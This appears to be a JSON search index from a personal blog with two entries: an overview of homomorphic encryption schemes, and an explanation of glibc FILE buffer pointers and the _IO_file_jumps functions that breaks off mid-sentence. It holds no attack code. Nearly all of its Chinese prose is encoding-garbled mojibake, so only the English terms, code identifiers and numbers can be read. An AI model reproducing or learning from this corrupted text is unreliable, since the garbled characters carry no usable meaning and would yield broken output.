[{"content":"References:ä¸€æ–‡äº†è§£åŒæ€åŠ å¯†ï¼ˆHomomorphic Encryption, HEï¼‰-CSDNåšå®¢\nğŸ“–æ¦‚è¿° åŸºæœ¬æ¦‚å¿µ\nåŒæ€åŠ å¯†ï¼ˆHomomorphic Encryption, HEï¼‰æ˜¯æŒ‡æ»¡è¶³å¯†æ–‡åŒæ€è¿ç®—æ€§è´¨çš„åŠ å¯†ç®—æ³•ï¼Œå³æ•°æ®ç»è¿‡åŒæ€åŠ å¯†ä¹‹åï¼Œå¯¹å¯†æ–‡è¿›è¡Œç‰¹å®šçš„è®¡ç®—ï¼Œå¾—åˆ°çš„å¯†æ–‡è®¡ç®—ç»“æœåœ¨è¿›è¡Œå¯¹åº”çš„åŒæ€è§£å¯†åçš„æ˜æ–‡ç­‰åŒäºå¯¹æ˜æ–‡æ•°æ®ç›´æ¥è¿›è¡Œç›¸åŒçš„è®¡ç®—ï¼Œå®ç°æ•°æ®çš„â€œå¯ç®—ä¸å¯è§â€\nå¦‚æœæ»¡è¶³ f(A)+f(B)=f(A+B)f(A)+f(B)=f(A+B) ï¼Œ æˆ‘ä»¬å°†è¿™ç§åŠ å¯†å‡½æ•°å«åšåŠ æ³•åŒæ€ å¦‚æœæ»¡è¶³ f(A)Ã—f(B)=f(AÃ—B)f(A)Ã—f(B)=f(AÃ—B) ï¼Œæˆ‘ä»¬å°†è¿™ç§åŠ å¯†å‡½æ•°å«åšä¹˜æ³•åŒæ€ã€‚\nç±»å‹ ç®—æ³• æ—¶é—´ è¯´æ˜ å®é™…åº”ç”¨ åŠåŒæ€åŠ å¯† ä¹˜æ³•åŒæ€RSA ç®—æ³• 1977 ééšæœºåŒ–åŠ å¯†ï¼Œå…·æœ‰ä¹˜æ³•åŒæ€æ€§çš„åŸå§‹ç®—æ³•é¢ä¸´é€‰æ‹©æ˜æ–‡æ”»å‡» åœ¨éåŒæ€åœºæ™¯ä¸­åº”ç”¨å¹¿æ³› ä¹˜æ³•åŒæ€ElGamal ç®—æ³• 1985 éšæœºåŒ–åŠ å¯† DSS æ•°å­—ç­¾åæ ‡å‡†åŸºäº ElGamal æ•°å­—ç­¾åç®—æ³•çš„å˜ä½“ åŠ æ³•åŒæ€Paillier ç®—æ³• 1999 åº”ç”¨æœ€ä¸ºæˆç†Ÿ è”é‚¦å­¦ä¹  æœ‰é™æ¬¡æ•°å…¨åŒæ€Boneh-Goh-Nissim æ–¹æ¡ˆ 2005 ä»…æ”¯æŒ 1 æ¬¡ä¹˜æ³•åŒæ€è¿ç®— / å…¨åŒæ€åŠ å¯† Gentry æ–¹æ¡ˆ 2009 ç¬¬ä¸€ä»£å…¨åŒæ€åŠ å¯†ï¼Œæ€§èƒ½è¾ƒå·® / BGV æ–¹æ¡ˆ 2012 ç¬¬äºŒä»£å…¨åŒæ€åŠ å¯†ï¼Œæ€§èƒ½ç›¸å¯¹è¾ƒå¥½ IBM HElib å¼€æºåº“ BFV æ–¹æ¡ˆ 2012 ç¬¬äºŒä»£å…¨åŒæ€åŠ å¯†ï¼Œä¸ BGV ç±»ä¼¼ å¾®è½¯ SEAL å¼€æºåº“ GSW æ–¹æ¡ˆ 2013 ç¬¬ä¸‰ä»£å…¨åŒæ€åŠ å¯†ï¼ŒåŸºäºè¿‘ä¼¼ç‰¹å¾å‘é‡ TFHE å¼€æºåº“ CKKS æ–¹æ¡ˆ 2017 å¯å®ç°æµ®ç‚¹æ•°è¿‘ä¼¼è®¡ç®—ï¼Œé€‚åˆæœºå™¨å­¦ä¹ å»ºæ¨¡åœºæ™¯ HElib å’Œ SEAL ","date":"2026-02-11T00:00:00Z","image":"https://A1ester.github.io/p/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%88%86%E7%B1%BB%E5%92%8C%E7%A0%94%E7%A9%B6/1_hu17581155795162200817.png","permalink":"https://A1ester.github.io/p/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E7%9A%84%E5%88%86%E7%B1%BB%E5%92%8C%E7%A0%94%E7%A9%B6/","title":"åŒæ€åŠ å¯†çš„åˆ†ç±»å’Œç ”ç©¶"},{"content":"Referencesï¼šhttps://bbs.kanxue.com/thread-275969.htm\nğŸ“–Base æ—¢ç„¶æ˜¯IOæ“ä½œï¼Œé‚£ä¹ˆå°±æœ‰å¿…è¦çŸ¥é“è®¡ç®—æœºåˆ°åº•æ˜¯æ€ä¹ˆè¯»å†™ç¡¬ç›˜æˆ–è€…å…¶ä»–è®¾å¤‡çš„ï¼Œæ­¤å¤„ä¸»è¦ä»¥å—è®¾å¤‡ä¸ºä¸»ã€‚ä»¥ç¡¬ç›˜ä¸ºä¾‹ï¼Œè¦æƒ³å’Œç¡¬ç›˜äº¤äº’ï¼Œè¯´ç™½äº†ä¹Ÿæ˜¯å’Œç¡¬ç›˜ä¸Šçš„èŠ¯ç‰‡+ç³»ç»Ÿäº¤äº’ï¼Œåœ¨x86çš„ä½“ç³»ä¸‹ï¼Œå…¶å®å°±æ˜¯å’Œç¡¬ç›˜ä¸Šçš„å¯„å­˜å™¨è¿›è¡Œäº¤äº’ï¼Œä¸ºäº†è®©è¿™ä¸ªè¿‡ç¨‹å˜çš„ç®€å•ï¼Œç¡¬ç›˜ä¸Šçš„å¯„å­˜å™¨è¢«æ˜ å°„æˆäº†ç«¯å£ï¼Œç¡¬ç›˜çš„ç«¯å£è¯´æ˜å¦‚ä¸‹è¡¨ã€‚è€Œèƒ½å¤Ÿäº¤äº’ç«¯å£çš„æ“ä½œå°±æ˜¯æ±‡ç¼–æŒ‡ä»¤ä¸­çš„in outï¼Œè¿™äº›æŒ‡ä»¤æ˜¯ç‰¹æƒæŒ‡ä»¤ï¼Œä¸‰ç¯æ— æ³•ä½¿ç”¨ï¼Œåƒæˆ‘ä»¬çš„å¸¸è¯´çš„åº•å±‚readæˆ–writeå‡½æ•°å…¶å®ä¹Ÿæ˜¯é æ“ä½œç³»ç»Ÿæ‰§è¡Œinï¼ŒoutæŒ‡ä»¤æ¥å®ç°å¤–éƒ¨è®¾å¤‡è¯»å†™çš„ã€‚å…·ä½“çš„æ‰§è¡Œç»†èŠ‚ä¸æ˜¯æˆ‘ä»¬çš„é‡ç‚¹ï¼Œä¸å†ç»†å†™ã€‚éœ€è¦çŸ¥é“çš„æ˜¯ï¼Œå¯¹äºLBAç¡¬ç›˜æ¥è¯´ï¼Œè¯»å†™æ•°æ®éƒ½å¿…é¡»ä¸€å—ä¸€å—çš„è¯»ï¼Œè¿™ä¹Ÿå°±æ˜¯å¸¸è¯´çš„å—è®¾å¤‡ã€‚\nI/Oåœ°å€ è¯»(ä¸»æœºä»ç¡¬ç›˜è¯»æ•°æ®) å†™(ä¸»æœºæ•°æ®å†™å…¥ç¡¬ç›˜) 1F0H æ•°æ®å¯„å­˜å™¨ æ•°æ®å¯„å­˜å™¨ 1F1H é”™è¯¯å¯„å­˜å™¨(åªè¯»å¯„å­˜å™¨) ç‰¹å¾å¯„å­˜å™¨ 1F2H æ‰‡åŒºè®¡æ•°å¯„å­˜å™¨ æ‰‡åŒºè®¡æ•°å¯„å­˜å™¨ 1F3H æ‰‡åŒºå·å¯„å­˜å™¨æˆ– LBA å—åœ°å€ 0~7 æ‰‡åŒºå·æˆ– LBA å—åœ°å€ 0~7 1F4H ç£é“æ•°ä½ 8 ä½æˆ– LBA å—åœ°å€ 8~15 ç£é“æ•°ä½ 8 ä½æˆ– LBA å—åœ°å€ 8~15 1F5H ç£é“æ•°é«˜ 8 ä½æˆ– LBA å—åœ°å€ 16~23 ç£é“æ•°é«˜ 8 ä½æˆ– LBA å—åœ°å€ 16~23 1F6H é©±åŠ¨å™¨/ç£å¤´æˆ– LBA å—åœ°å€ 24~27 é©±åŠ¨å™¨/ç£å¤´æˆ– LBA å—åœ°å€ 24~27 1F7H å‘½ä»¤å¯„å­˜å™¨æˆ–çŠ¶æ€å¯„å­˜å™¨ å‘½ä»¤å¯„å­˜å™¨ [!NOTE]\nRing 0ï¼ˆå†…æ ¸æ€ï¼‰ï¼šæœ€é«˜ç‰¹æƒçº§ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸ã€é©±åŠ¨ç¨‹åºè¿è¡Œäºæ­¤ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œæ‰€æœ‰ CPU æŒ‡ä»¤ï¼ŒåŒ…æ‹¬ in/out è¿™ç±» I/O ç‰¹æƒæŒ‡ä»¤ï¼Œç›´æ¥æ“ä½œç¡¬ä»¶ã€‚\nRing 1ã€Ring 2ï¼šä¸­é—´ç‰¹æƒçº§ï¼Œç°ä»£æ“ä½œç³»ç»Ÿï¼ˆå¦‚ Linuxã€Windowsï¼‰åŸºæœ¬ä¸å†ä½¿ç”¨ï¼Œä¸»è¦ç”¨äºå†å²ä¸Šçš„é©±åŠ¨æˆ–æœåŠ¡ã€‚\nRing 3ï¼ˆç”¨æˆ·æ€ / ä¸‰ç¯ï¼‰ï¼šæœ€ä½ç‰¹æƒçº§ï¼Œä¸èƒ½ç›´æ¥æ‰§è¡Œ in/out è¿™ç±»ç¡¬ä»¶æ“ä½œæŒ‡ä»¤ã€‚\nâŒ¨ï¸IOæ•°æ®ç»“æ„ å¯¹äºLBAç¡¬ç›˜æ¥è¯´ï¼Œè¯»å†™æ•°æ®éƒ½å¿…é¡»ä¸€å—ä¸€å—çš„è¯»ï¼Œå¦‚æœæˆ‘ä»¬æ¯æ¬¡æ‰§è¡Œreadï¼Œwriteæ—¶éƒ½æ˜¯æ“ä½œå¾ˆå°‘çš„æ•°æ®ï¼Œåˆ™å¯¹ç³»ç»Ÿæ¶ˆè€—éå¸¸å¤§ï¼Œå› æ­¤ï¼ŒCåº“å°±æƒ³äº†ä¸€ä¸ªå¥½åŠæ³•â€”â€”ç¼“å†²åŒºã€‚æ‰€ä»¥ï¼Œå°±æ¯”è¾ƒå¥½ç†è§£äº†ï¼Œç¼“å†²åŒºæ˜¯ä¸ºäº†å‡å°‘3åæ“ä½œå¤–éƒ¨ç¡¬ä»¶æ—¶çš„æ¶ˆè€—äº§ç”Ÿçš„ï¼Œä¸€åˆ‡éƒ½æ˜¯ä»¥å¤–éƒ¨ç¡¬ä»¶ä¸ºæœåŠ¡å¯¹è±¡ã€‚\n[!NOTE]\nLBAï¼ˆLogical Block Addressingï¼Œé€»è¾‘å—å¯»å€ï¼‰ï¼Œå®ƒæŠŠç¡¬ç›˜ä¸Šçš„æ‰€æœ‰æ‰‡åŒºï¼ˆSectorï¼‰ç»Ÿä¸€ç¼–å·æˆä¸€ä¸ªä» 0 å¼€å§‹é€’å¢çš„çº¿æ€§åºåˆ—ã€‚\næ¯ä¸ªæ‰‡åŒºé€šå¸¸æ˜¯ 512 å­—èŠ‚ï¼ˆæˆ– 4KBï¼‰ã€‚ æ“ä½œç³»ç»Ÿåªéœ€è¦çŸ¥é“ â€œè¦è®¿é—®ç¬¬ N ä¸ªé€»è¾‘å—â€ï¼Œè€Œä¸ç”¨å…³å¿ƒè¿™ä¸ªå—åœ¨ç¡¬ç›˜ä¸Šçš„ç‰©ç†ä½ç½®ï¼ˆå¦‚ç£å¤´ã€æŸ±é¢ã€æ‰‡åŒºï¼‰ã€‚ æ‰€ä»¥LBA ç¡¬ç›˜ä»¥ å—ï¼ˆBlockï¼Œé€šå¸¸æ˜¯å¤šä¸ªæ‰‡åŒºï¼‰ä¸ºæœ€å°è¯»å†™å•ä½ï¼Œè€Œä¸æ˜¯å•ä¸ªå­—èŠ‚ã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ“ä½œç³»ç»Ÿå’Œ C åº“è¦å¼•å…¥ç¼“å†²åŒºï¼ˆBufferï¼‰ï¼Œé€šè¿‡æ‰¹é‡è¯»å†™æ¥å‡å°‘ I/O æ¬¡æ•°ï¼Œæé«˜æ•ˆç‡ã€‚ 1.ä»å¤–éƒ¨ç¡¬ä»¶è¯»å–æ—¶ã€‚ä¸ºäº†å‡å°‘æ¶ˆè€—ï¼Œä¼šä¸€æ¬¡ä»å¤–éƒ¨ç¡¬ä»¶è¯»å–ä¸€â€œå—â€æ•°æ®ï¼Œå¹¶æ”¾å…¥ç¼“å†²åŒºï¼Œç„¶åå½“targetéœ€è¦æ—¶ï¼Œå†ä»å¤´éƒ¨æ…¢æ…¢è¯»å–ï¼Œåªåˆ°è¯»å®Œæ‰å†æ¬¡ä»ç¡¬ä»¶è¯»å–ã€‚è¿™ä¸ªç¼“å†²åŒºå«è¾“å…¥ç¼“å†²åŒºã€‚\n2.å‘å¤–éƒ¨ç¡¬ä»¶å†™å…¥æ—¶ã€‚ä¸ºäº†å‡å°‘æ¶ˆè€—ï¼Œä¸ä¼šä¸€æœ‰ä¸œè¥¿å°±å†™å…¥ï¼Œè€Œæ˜¯å…ˆå°†å†…å®¹ä»sourceå†™å…¥ç¼“å†²åŒºï¼Œå½“ç¼“å†²åŒºæ»¡äº†æ—¶å€™å†å°†å†…å­˜ä¸€èµ·å†™å…¥ç¡¬ä»¶ã€‚è¿™ä¸ªç¼“å†²åŒºå«è¾“å‡ºç¼“å†²åŒºã€‚\nä¸ºäº†æ›´å¥½çš„å®šä½ï¼Œå¯¹æ¯ä¸ªæ“ä½œæˆ‘ä»¬è‚¯å®šè‡³å°‘è¦æœ‰3ä¸ªåŸºç¡€æ•°æ®ã€‚é¦–å…ˆï¼Œä»¥ä»å¤–éƒ¨ç¡¬ä»¶è¯»å–ä¸ºä¾‹ï¼Œæˆ‘ä»¬è¦æœ‰è¾“å…¥ç¼“å†²åŒºå¼€å§‹ï¼ˆbaseï¼‰ã€ç»“å°¾ï¼ˆendï¼‰å’Œå½“å‰ï¼ˆptrï¼‰å·²ç»ç”¨äº†å¤šå°‘çš„æŒ‡é’ˆã€‚å¾ˆæ˜æ˜¾å½“ptr == endæ—¶ï¼Œè¯´æ˜è¾“å…¥ç¼“å†²åŒºé‡Œçš„ä¸œè¥¿å·²ç»å…¨éƒ¨è¯»å®Œï¼Œéœ€è¦é‡æ–°ä»ç¡¬ä»¶è¯»å…¥ã€‚\nåŒæ ·ï¼Œå¯¹äºå‘å¤–éƒ¨ç¡¬ä»¶å†™å…¥ä¸ºä¾‹ï¼Œæˆ‘ä»¬è¦æœ‰è¾“å‡ºç¼“å†²åŒºå¼€å§‹ï¼ˆbaseï¼‰ã€ç»“å°¾ï¼ˆendï¼‰å’Œå½“å‰ï¼ˆptrï¼‰å·²ç»å†™äº†å¤šå°‘çš„æŒ‡é’ˆã€‚å¾ˆæ˜æ˜¾å½“ptr == endæ—¶ï¼Œè¯´æ˜è¾“å‡ºç¼“å†²åŒºå·²ç»å†™æ»¡ï¼Œå¯ä»¥å‘ç¡¬ä»¶å†™å…¥äº†ã€‚\nä¸Šé¢çš„å†…å®¹çœ‹ä¼¼éå¸¸æ¸…æ¥šï¼Œä½†è¿™é‡Œå…¶å®æœ‰ä¸€äº›æ¯”è¾ƒå®¹æ˜“æ··ä¹±çš„åœ°æ–¹ã€‚å› ä¸ºç¼“å†²åŒºå†…å­˜å‚¨çš„æ˜¯æ•°æ®ï¼Œè¾“å…¥ã€è¾“å‡ºä¸¤è€…æ•°æ®æµåŠ¨æ–¹å‘ä¸åŒï¼Œä½†ä¿æŠ¤ä¸»ä½“éƒ½ä¸€æ ·ï¼Œéƒ½æ˜¯å¤–éƒ¨è®¾å¤‡ï¼Œæ‰€ä»¥æœ‰ç”¨çš„æ•°æ®éƒ¨åˆ†å°±æœ‰æ‰€ä¸ç›¸åŒã€‚\nå¯¹äºè¾“å…¥ç¼“å†²åŒºptr-endæ˜¯æœ‰ç”¨çš„æ•°æ®ï¼Œbase-pträ¸ºå·²ä½¿ç”¨çš„æ•°æ®ã€‚\nå¯¹äºè¾“å‡ºç¼“å†²åŒºbase-ptræ˜¯è¦å†™å…¥ç¡¬ä»¶çš„å†…å®¹ï¼ˆæœ‰ç”¨æ•°æ®ï¼‰ï¼Œptr-endä¸ºç©ºé—²åŒºåŸŸã€‚\nä¸¤è€…ç»“å°¾æœ‰æ‰€ä¸åŒã€‚\n(1)å¯¹äºè¾“å…¥ç¼“å†²åŒºï¼Œå› ä¸ºä»ç¡¬ç›˜ä¸­è¯»å–çš„æ•°æ®å¯èƒ½æ— æ³•å¡«æ»¡æ•´ä¸ªç¼“å†²åŒºçš„å—ï¼Œæ‰€ä»¥_IO_buf_end != _IO_read_endã€‚è¾“å…¥ç¼“å†²åŒºè¦ä½¿ç”¨_IO_read_endåˆ¤æ–­ç»“æŸã€‚\n(2)å¯¹äºè¾“å‡ºç¼“å†²åŒºï¼Œç¼“å†²åŒºçš„ç»“æŸå°±æ˜¯è¾“å‡ºç¼“å†²åŒºç»“æŸï¼Œ_IO_buf_end == _IO_write_endã€‚è¾“å‡ºç¼“å†²åŒºå¾€å¾€ä½¿ç”¨_IO_buf_endåˆ¤æ–­ç»“æŸã€‚\nè™½ç„¶ï¼Œè¾“å…¥ã€è¾“å‡ºç¼“å†²åŒºä½œç”¨ä¸åŒï¼Œä½†åŸç†ä¸Šéƒ½æ˜¯ä¸€å—å†…å­˜ã€‚ä¸€å—å¤–éƒ¨è®¾å¤‡å¯èƒ½æ—¢å¯ä»¥å†™å…¥ä¹Ÿå¯ä»¥è¯»å–ï¼Œä¸ºäº†èŠ‚çœç©ºé—´ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€å—ç¼“å†²åŒºï¼Œéœ€è¦è¾“å…¥çš„æ—¶å€™å°±åšè¾“å…¥ç¼“å†²åŒºï¼Œéœ€è¦è¾“å‡ºå°±åšè¾“å‡ºç¼“å†²åŒºã€‚é‚£ä¹ˆæˆ‘ä»¬å°±æœ‰äº†8ä¸ªæŒ‡é’ˆã€‚\n1 2 3 4 5 6 7 8 char *_IO_buf_base; // ç¼“å†²åŒºçš„åŸºåœ°å€ char *_IO_buf_end; // ç¼“å†²åŒºçš„ç»“æŸåœ°å€ char *_IO_read_base; // è¾“å…¥ç¼“å†²åŒºåŸºåœ°å€ char *_IO_read_ptr; // è¾“å…¥å½“å‰ä½ç½® char *_IO_read_end; // è¾“å…¥ç¼“å†²åŒºç»“å°¾åœ°å€ char *_IO_write_base;// è¾“å‡ºç¼“å†²åŒºåŸºåœ°å€ char *_IO_write_ptr; // è¾“å‡ºå½“å‰ä½ç½® char *_IO_write_end; // è¾“å‡ºç¼“å†²åŒºç»“å°¾åœ°å€ é‚£ä¹ˆåˆ°ç°åœ¨ï¼ŒåŸºæœ¬æ€è·¯ç†æ¸…äº†ï¼Œå…¶ä»–å°±æ–¹ä¾¿äº†.\n1ï¼‰ä»æ–‡ä»¶ä¸­è¯»å–ï¼š ç¨‹åºæ˜¯ä»fdä¸­è¯»å–ä¸€æ‰¹æ•°æ®åˆ°ç¼“å†²åŒºä¸­ï¼ˆ_IO_buf_base è‡³ _IO_buf_endï¼‰ï¼Œ_IO_read_ptr æŒ‡å‘å·²å‘targetä¸­å†™å®Œçš„ä½ç½®ï¼Œæ—¢ _IO_read_ptr è‡³ _IO_read_end ä¸ºè¿˜æ²¡æœ‰å†™å…¥targetä¸­çš„æ•°æ®ã€‚å½“_IO_read_ptr == _IO_read_endæ—¶ï¼Œè¯´æ˜è¾“å…¥ç¼“å†²åŒºå†…å·²ç»æ²¡æœ‰å¯ç”¨æ•°æ®ï¼Œéœ€è¦å†æ¬¡ä»æ–‡ä»¶ä¸­è¯»å…¥æ•°æ®ã€‚\n2ï¼‰å‘æ–‡ä»¶è¾“å‡ºï¼š ç¨‹åºæ˜¯å…ˆå°†sourceä¸­çš„æ•°æ®å†™å…¥åˆ°ç¼“å†²åŒºä¸­ï¼Œ_IO_write_ptr æŒ‡å‘å·²ä»sourceä¸­å†™åˆ°çš„ä½ç½®ï¼Œæ—¢ _IO_write_ptr è‡³ _IO_write_pend ä¸ºè¿˜å‰©ä½™çš„ç©ºé—´ã€‚å½“_IO_write_ptr == _IO_buf_endæ—¶ï¼Œå†å…¨éƒ¨å†™å…¥fdä¸­ã€‚\nğŸ› ï¸æ•°æ®æ“ä½œ æ—¢ç„¶æœ‰äº†æ•°æ®ç»“æ„ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç®€å•å®šä¹‰ä¸€äº›æ“ä½œæ¥è¿›è¡Œæ“ä½œã€‚\nä»ç¡¬ç›˜ä¸­è¯»å…¥æ•°æ® è¿™ä¸ªé€»è¾‘å‰é¢å·²ç»è¯´çš„éå¸¸æ¸…æ¥šï¼Œç®€å•é€»è¾‘å¦‚ä¸‹ã€‚\nä»fdä¸­è¯»å–ä¸€æ‰¹ï¼ˆä¸€å—ï¼‰æ•°æ®åˆ°è¾“å…¥ç¼“å†²åŒºä¸­ï¼ˆ_IO_buf_base è‡³ _IO_buf_endï¼‰ï¼ŒåŒæ—¶å¯¹_IO_read_base _IO_read_ptr _IO_read_end è®¾ç½®åˆå§‹å€¼ã€‚ï¼ˆ_IO_read_ptr == _IO_read_base ï¼Œå½“ç„¶ä¹Ÿå¯èƒ½ä¸åŒï¼‰ ä»_IO_read_ptr å¤„å‘éœ€è¦çš„å†…å­˜ä¸­å¤åˆ¶æ•°æ®ï¼ŒåŒæ—¶æŠŠ_IO_read_ptr å‘åç§»ä½ã€‚ å½“_IO_read_ptr == _IO_read_endæ—¶ï¼Œè¯´æ˜ç¼“å†²åŒºå†…å·²ç»æ²¡æœ‰å¯ç”¨æ•°æ®ï¼Œéœ€è¦å†æ¬¡ä»æ–‡ä»¶ä¸­è¯»å…¥æ•°æ®ã€‚å†²å…¥ç¬¬ä¸€æ­¥ã€‚ å‘ç¡¬ç›˜ä¸­å†™å…¥æ•°æ® åŒç†ï¼Œæ“ä½œé€»è¾‘å¦‚ä¸‹ã€‚\nå…ˆå°†sourceä¸­çš„æ•°æ®å¤åˆ¶åˆ°è¾“å‡ºç¼“å†²åŒºä¸­ï¼Œ_IO_write_ptr æŒ‡å‘å·²å†™åˆ°çš„ä½ç½®ã€‚ å½“_IO_write_ptr == _IO_buf_endæ—¶ï¼Œå°†ç¼“å†²åŒºä¸­çš„å†…å®¹å…¨éƒ¨å†™å…¥fdä¸­ï¼Œå¹¶å°†_IO_write_ptrè®¾ç½®ä¸º _IO_write_baseï¼Œé‡å¤ç¬¬ä¸€æ­¥ã€‚ ä¸Šé¢çš„æ“ä½œä¸­ï¼Œæˆ‘ä»¬è¿˜å¿˜äº†ä¸€ä¸ªåŸºæœ¬çš„é—®é¢˜ï¼š**ç¼“å†²åŒºä»å“ªé‡Œæ¥ï¼Ÿ**å…¶å®ç¼“å†²åŒºå°±æ˜¯ä¸€å—å†…å­˜ï¼Œå¯ä»¥åœ¨æ ˆä¸Šã€å †ä¸Šã€libcä¸­ï¼Œç”šè‡³éšä¾¿mmapä¸€å—å†…å­˜éƒ½å¯ä»¥ï¼Œä½†ä¸è®ºæ€ä¹ˆæ¥ï¼Œæˆ‘ä»¬éƒ½éœ€è¦è¿™æ ·ä¸€å—åŒºåŸŸï¼Œåœ¨æ­¤ï¼Œæˆ‘ä»¬å€Ÿç”¨glibcä¸­åœ¨mallocçš„æ–¹æ³•æ¥ç”³è¯·ç¼“å†²åŒºã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦ç¬¬ä¸‰ä¸ªæ“ä½œã€‚\nç”³è¯·ç¼“å†²åŒº è¿™ä¸ªæ“ä½œéå¸¸ç®€å•ã€‚\nç”³è¯·ä¸€å—ç¼“å†²åŒºï¼Œå¹¶è®¾ç½®_IO_buf_baseä¸ºå¼€å¤´ï¼Œ_IO_buf_endä¸ºç»“å°¾ã€‚\nåˆ°æ­¤ä¸ºæ­¢ï¼ŒIOçš„æ‰€æœ‰åŸºæœ¬æ“ä½œå°±å·²ç»ç®—æ˜¯å®Œæˆäº†ã€‚å½“ç„¶ï¼Œæ“ä½œä¸­è¿˜éœ€è¦ä¸€äº›å®‰å…¨æ£€æµ‹ï¼Œä¾‹å¦‚åˆ¤æ–­ç¼“å†²åŒºæ˜¯å¦å­˜åœ¨ã€mallocæ˜¯å¦æˆåŠŸç­‰å†…å®¹ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¥glibcä¸­_IO_file_jumpsä¸ºä¾‹ï¼Œæ¢³ç†ä¸€ä¸‹å‡½æ•°æ“ä½œçš„æ„å›¾ã€‚\nâœï¸_IO_file_jumps å‡½æ•°æ“ä½œ è¯´æ˜é¡ºåºæ ¹æ®_IO_file_jumpsä¸­çš„æ“ä½œé¡ºåºæ¥ï¼Œå› ä¸ºé‡Œé¢çš„äº’ç›¸è°ƒç”¨è¿˜æ˜¯æŒºå¤šçš„ï¼Œå°±ä¸è¯´å…·ä½“å†™è¿‡ç¨‹ï¼Œä¸»è¦è¯´æ˜æ“ä½œçš„æ„å›¾ã€‚\n_IO_new_file_finish è¿™ä¸ªçœ‹åå­—å°±éå¸¸ç®€å•ï¼Œæ˜¯æ–‡ä»¶ç»“æŸçš„æ“ä½œï¼Œæ‰€ä»¥å®ƒçš„æ“ä½œå¦‚ä¸‹\næ¸…ç©ºæ‰€æœ‰ç¼“å†²åŒº å…³é—­ï¼ˆcloseï¼‰æ–‡ä»¶ _IO_new_file_overflow è¿™ä¸ªå‡½æ•°æ„å›¾æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯å¤„ç†å½“è¾“å‡ºç¼“å†²åŒºç”¨å®Œæ—¶ï¼Œå‘ç¡¬ç›˜å†™å…¥æ•°æ®ã€‚å½“ç„¶ï¼Œå…¶å®è¿™ä¸ªå‡½æ•°å†…éƒ¨éå¸¸å¤æ‚ï¼ŒåŠ å…¥äº†ä¸€äº›æ£€æµ‹ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç¼“å†²åŒºä¸å­˜åœ¨åˆ™è¦åˆå§‹åŒ–ç¼“å†²åŒºã€‚å¹¶ä¸”ï¼Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°ä¸­æœ‰ä¸€ä¸ªæ ‡å¿—ä½ã€‚\nå¦‚æœ ch == EOFï¼Œåˆ™è¾“å‡ºf-\u0026gt;_IO_write_ptr - f-\u0026gt;_IO_write_baseçš„åŒºé—´ã€‚ å¦‚æœ ch != EOFï¼Œå¹¶ä¸”f-\u0026gt;_IO_write_ptr == f-\u0026gt;_IO_buf_endï¼Œåˆ™å°†ç¼“å†²åŒºå…¨éƒ¨è¾“å‡ºã€‚ å¦‚æœ ch == '\\n'ï¼Œåˆ™è¾“å‡º f-\u0026gt;_IO_write_ptr - f-\u0026gt;_IO_write_baseåŠ ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚ ä»¥ä¸Šéƒ½ä¸æ»¡è¶³å°±è¿”å› chã€‚ _IO_new_file_underflow è¿™ä¸ªå‡½æ•°ä¸_IO_new_file_overflowå·®ä¸å¤šï¼Œä¸»è¦æ˜¯ç”¨äºä»ç¡¬ç›˜ä¸­è¯»å–æ•°æ®ï¼Œæ¯æ¬¡è¯»å–éƒ½æ˜¯_IO_buf_base è‡³ _IO_buf_endã€‚ä¸ºäº†é˜²æ­¢ç¡¬ç›˜ä¸­æ²¡æœ‰è¿™ä¹ˆå¤šæ•°æ®ï¼Œè®¾ç½®_IO_read_endä¸ºè¯»å–çš„æ€»æ•°ã€‚å¦‚æœï¼Œç¼“å†²åŒºä¸å­˜åœ¨åˆ™è¦åˆå§‹åŒ–ç¼“å†²åŒºã€‚ç¨‹åºè¿”å›_IO_read_ptræŒ‡é’ˆã€‚\n__GI__IO_default_uflowï¼ˆ_IO_default_uflowï¼‰ è¿™ä¸ªå‡½æ•°å°±æ˜¯è°ƒç”¨_IO_new_file_underflowï¼Œå¹¶ç®€å•åšäº†ä¸€äº›æ£€æµ‹ã€‚\n__GI__IO_default_pbackfailï¼ˆ_IO_default_pbackfailï¼‰ è®¾ç½®å­˜å‚¨çš„å‡½æ•°ï¼Œæš‚ä¸é‡è¦ã€‚\n_IO_new_file_xsputn è¿™ä¸ªå‡½æ•°æ˜¯ä¸»è¦ç›®çš„æ˜¯å°†æ•°æ®ä»sourceæ”¾å…¥è¾“å‡ºç¼“å†²åŒºã€‚æ˜¾ç„¶ï¼Œæ”¾å…¥è¿‡ç¨‹ä¸­è¿˜æœ‰å‡ ç§æƒ…å†µã€‚\nå¦‚æœè¦å†™å…¥çš„æ•°æ®å°äºå‰©ä½™çš„ç©ºé—´_IO_write_ptr - _IO_buf_endï¼Œé‚£ä¹ˆå°±ç›´æ¥å°†æ•°æ®å†™å…¥è¾“å‡ºç¼“å†²åŒºå³å¯ã€‚\nå¦‚æœè¦å†™å…¥çš„æ•°æ®å¤§äºå‰©ä½™çš„ç©ºé—´_IO_write_ptr - _IO_buf_endã€‚\n(1)å…ˆå°†è¾“å‡ºç¼“å†²åŒºå¡«æ»¡ï¼Œå†è°ƒç”¨_IO_new_file_overflowæ¸…ç©ºè¾“å‡ºç¼“å†²åŒºã€‚\n(2)å‰©ä½™çš„æ•°æ®ç»§ç»­è°ƒç”¨ _IO_new_file_xsputn\nè¯´æ˜ï¼šæˆ‘ä»¬å¹³æ—¶çš„è¾“å‡ºå‡½æ•°ä¸»è¦å°±æ˜¯è°ƒç”¨æ­¤å‡½æ•°ã€‚\n__GI__IO_file_xsgetnï¼ˆ_IO_file_xsgetnï¼‰ è¿™ä¸ªå‡½æ•°æ˜¯ä¸»è¦ç›®çš„æ˜¯å°†æ•°æ®ä»è¾“å…¥ç¼“å†²åŒºæ”¾å…¥targetã€‚æ˜¾ç„¶æ”¾å…¥è¿‡ç¨‹ä¸­è¿˜æœ‰å‡ 